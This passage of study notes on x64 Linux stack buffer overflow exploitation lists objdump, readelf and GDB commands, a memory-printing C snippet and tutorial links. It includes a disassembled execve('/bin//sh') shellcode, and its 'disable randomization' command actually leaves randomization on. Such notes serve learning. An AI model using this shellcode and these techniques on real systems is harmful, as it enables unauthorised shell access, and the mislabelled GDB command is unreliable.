$ objdump -s -j .rodata stack_overflow

stack_overflow:     file format elf64-x86-64

Contents of section .rodata:
 2000 01000200 456e7465 72206120 70617373  ....Enter a pass
 2010 776f7264 3a200025 73005355 43434553  word: .%s.SUCCES
 2020 53004641 494c4544 00456e74 65726564  S.FAILED.Entered
 2030 20706173 73776f72 643a2000 52657175   password: .Requ
 2040 69726564 20706173 73776f72 643a2000  ired password: .
```

Get a lot of information about elf binary:
```bash
$ readelf -a stack_overflow
```

Dissasemble binary file, e.g. shellcode:
```bash
$ ndisasm -b 64 exp.in 
00000000  31C0              xor eax,eax
00000002  48BBD19D9691D08C  mov rbx,0xff978cd091969dd1
         -97FF
0000000C  48F7DB            neg rbx
0000000F  53                push rbx
00000010  54                push rsp
00000011  5F                pop rdi
00000012  99                cdq
00000013  52                push rdx
00000014  57                push rdi
00000015  54                push rsp
00000016  5E                pop rsi
00000017  B03B              mov al,0x3b
00000019  0F05              syscall
```

Show specific function via objdump:
```bash
$ objdump -d mysh | awk -v RS= '/^[[:xdigit:]]+ <main>/'
0000000000001169 <main>:
    1169:	f3 0f 1e fa          	endbr64 
    116d:	55                   	push   %rbp
    116e:	48 89 e5             	mov    %rsp,%rbp
    1171:	48 83 ec 20          	sub    $0x20,%rsp
    1175:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    117c:	00 00 
    117e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1182:	31 c0                	xor    %eax,%eax
    1184:	48 8d 05 79 0e 00 00 	lea    0xe79(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    118b:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    118f:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
    1196:	00 
    1197:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    119b:	ba 00 00 00 00       	mov    $0x0,%edx
    11a0:	48 89 c6             	mov    %rax,%rsi
    11a3:	48 8d 05 5a 0e 00 00 	lea    0xe5a(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    11aa:	48 89 c7             	mov    %rax,%rdi
    11ad:	e8 be fe ff ff       	call   1070 <execve@plt>
    11b2:	b8 00 00 00 00       	mov    $0x0,%eax
    11b7:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    11bb:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
    11c2:	00 00 
    11c4:	74 05                	je     11cb <main+0x62>
    11c6:	e8 95 fe ff ff       	call   1060 <__stack_chk_fail@plt>
    11cb:	c9                   	leave  
    11cc:	c3                   	ret    

```

Disable randomization in GDB:
```bash
gdb-peda$ set disable-randomization off
```

Set memory value in GDB:
```bash
set {long}0x7FFFFFFFDDB8=3512927136882554368
```

Print memory:
```c
    printf("%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX\n",
        enteredPassword[24],
        enteredPassword[25],
        enteredPassword[26],
        enteredPassword[27],
        enteredPassword[28],
        enteredPassword[29],
        enteredPassword[30],
        enteredPassword[31]);
```

# Useful links
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
- https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
- https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f
- https://shell-storm.org/
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid
- https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
- https://www.bordergate.co.uk/64-bit-nx-bypass/
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
- https://sploitfun.blogspot.com/2013/06/dynamic-linking-internals.html
- https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-5-aslr-394d0dc8e4fb
- https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools
- https://pollevanhoof.be/nuggets/buffer_overflow_linux/4_stack_canaries
- https://pollevanhoof.be/nuggets/buffer_overflow_linux/5_PIE_bypass
- https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-4-stack-canaries-e9b6dd2c3127
- https://sourceware.org/gdb/onlinedocs/gdb/Memory.html